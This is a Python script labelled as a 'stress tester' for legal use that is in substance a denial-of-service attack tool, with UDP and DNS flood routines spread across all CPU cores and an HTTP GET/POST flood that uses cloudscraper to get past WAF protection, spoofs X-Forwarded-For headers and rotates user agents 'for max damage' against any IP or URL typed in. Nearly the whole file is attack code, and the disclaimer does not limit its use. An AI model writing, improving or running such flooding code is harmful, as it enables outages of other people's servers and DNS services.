#!/usr/bin/env python3
"""
⚡ ULTRA STRESS TESTER PRO ⚡
Author: Security Researcher (Legal Use Only)
Description: High-performance Layer 4 & 7 stress tester
"""

import os
import sys
import time
import random
import socket
import threading
import argparse
import asyncio
import aiohttp
import cloudscraper
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Manager, Process
from fake_useragent import UserAgent

# ========================
# 🎨 COLOR SETUP
# ========================
class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    END = "\033[0m"

# ========================
# ⚙️ CONFIGURATION
# ========================
MAX_THREADS = 100000  # Extreme threading
MAX_DURATION = 7200   # 2 hours max
REQUEST_TIMEOUT = 15  # Seconds
PACKET_SIZE = 1024    # 1KB packets for 1Gbps

# 30+ Real User Agents (Modern Browsers)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    # Add 26 more...
]

# ========================
# 🛠️ TOOLS
# ========================
def get_random_ua():
    return random.choice(USER_AGENTS)

def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

# ========================
# 🌩️ LAYER 4 ATTACKS (1Gbps+)
# ========================
class Layer4Attacks:
    @staticmethod
    def udp_flood(target_ip, target_port, duration, stats):
        payload = os.urandom(PACKET_SIZE)  # 1KB packets
        end_time = time.time() + duration
        
        def flood():
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(payload, (target_ip, target_port))
                    stats['sent'] += 1
                    sock.close()
                except:
                    stats['errors'] += 1
        
        # Multi-process for 1Gbps
        processes = []
        for _ in range(os.cpu_count() * 2):  # Utilize all cores
            p = Process(target=flood)
            p.start()
            processes.append(p)
        
        for p in processes:
            p.join()

    @staticmethod
    def dns_flood(target_ip, duration, stats):
        dns_query = bytearray.fromhex("AA AA 01 00 00 01 00 00 00 00 00 00") + os.urandom(16)
        end_time = time.time() + duration
        
        def flood():
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(dns_query, (target_ip, 53))
                    stats['sent'] += 1
                    sock.close()
                except:
                    stats['errors'] += 1
        
        # Multi-process for max power
        processes = []
        for _ in range(os.cpu_count() * 2):
            p = Process(target=flood)
            p.start()
            processes.append(p)
        
        for p in processes:
            p.join()

# ========================
# 🔥 LAYER 7 ATTACKS (BYPASS)
# ========================
class Layer7Attacks:
    @staticmethod
    async def http_flood(url, workers, duration, stats):
        end_time = time.time() + duration
        scraper = cloudscraper.create_scraper()
        
        async def worker():
            while time.time() < end_time:
                try:
                    headers = {
                        "User-Agent": get_random_ua(),
                        "X-Forwarded-For": get_random_ip(),
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                    }
                    
                    # Alternate GET/POST for max damage
                    if random.choice([True, False]):
                        scraper.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
                    else:
                        scraper.post(url, headers=headers, data={"data": os.urandom(64).hex()}, timeout=REQUEST_TIMEOUT)
                    
                    stats['sent'] += 1
                except:
                    stats['errors'] += 1
        
        # Async flood for max speed
        tasks = []
        for _ in range(workers):
            tasks.append(asyncio.create_task(worker()))
        
        await asyncio.gather(*tasks)

# ========================
# 🖥️ USER INTERFACE
# ========================
def show_banner():
    print(f"""{Colors.BLUE}
    ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
    ╠═╣║ ║╠═╣║  ╠╩╗║╣ ╠╦╝
    ╩ ╩╚═╝╩ ╩╚═╝╩ ╩╚═╝╩╚═ {Colors.END}
    {Colors.RED}⚡ ULTRA STRESS TESTER PRO ⚡{Colors.END}
    {Colors.YELLOW}FOR LEGAL TESTING ONLY!{Colors.END}
    """)

def layer4_menu():
    print(f"\n{Colors.BOLD}LAYER 4 MENU:{Colors.END}")
    print(f"{Colors.GREEN}1{Colors.END} - UDP Flood (1Gbps+)")
    print(f"{Colors.GREEN}2{Colors.END} - DNS Flood (Anti-DDoS)")
    choice = input(f"{Colors.YELLOW}Select method (1-2): {Colors.END}")
    
    stats = {'sent': 0, 'errors': 0}
    
    if choice == "1":
        target_ip = input("Target IP: ")
        target_port = int(input("Target Port: "))
        duration = min(int(input(f"Duration (seconds, max {MAX_DURATION}): ")), MAX_DURATION)
        
        print(f"{Colors.RED}\n🚀 Starting UDP Flood (1Gbps+)...{Colors.END}")
        Layer4Attacks.udp_flood(target_ip, target_port, duration, stats)
        
    elif choice == "2":
        target_ip = input("DNS Server IP: ")
        duration = min(int(input(f"Duration (seconds, max {MAX_DURATION}): ")), MAX_DURATION)
        
        print(f"{Colors.RED}\n🚀 Starting DNS Flood (Anti-DDoS)...{Colors.END}")
        Layer4Attacks.dns_flood(target_ip, duration, stats)
    
    print(f"\n{Colors.GREEN}Attack finished!{Colors.END}")
    print(f"Packets Sent: {stats['sent']:,}")
    print(f"Errors: {stats['errors']:,}")

def layer7_menu():
    print(f"\n{Colors.BOLD}LAYER 7 MENU:{Colors.END}")
    print(f"{Colors.GREEN}1{Colors.END} - HTTP Flood (Bypass WAF)")
    
    choice = input(f"{Colors.YELLOW}Select method (1): {Colors.END}")
    
    stats = {'sent': 0, 'errors': 0}
    
    if choice == "1":
        url = input("Target URL (include http://): ")
        workers = min(int(input("Workers (recommend 1000+): ")), MAX_THREADS)
        duration = min(int(input(f"Duration (seconds, max {MAX_DURATION}): ")), MAX_DURATION)
        
        print(f"{Colors.RED}\n🚀 Starting HTTP Flood (Bypass Mode)...{Colors.END}")
        asyncio.run(Layer7Attacks.http_flood(url, workers, duration, stats))
    
    print(f"\n{Colors.GREEN}Attack finished!{Colors.END}")
    print(f"Requests Sent: {stats['sent']:,}")
    print(f"Errors: {stats['errors']:,}")

def main():
    show_banner()
    print(f"{Colors.BOLD}Select Attack Type:{Colors.END}")
    print(f"{Colors.GREEN}1{Colors.END} - Layer 4 (UDP/DNS)")
    print(f"{Colors.GREEN}2{Colors.END} - Layer 7 (HTTP Bypass)")
    
    choice = input(f"{Colors.YELLOW}Your choice (1-2): {Colors.END}")
    
    if choice == "1":
        layer4_menu()
    elif choice == "2":
        layer7_menu()
    else:
        print(f"{Colors.RED}Invalid choice!{Colors.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Script terminated by user.{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}Error: {str(e)}{Colors.END}")
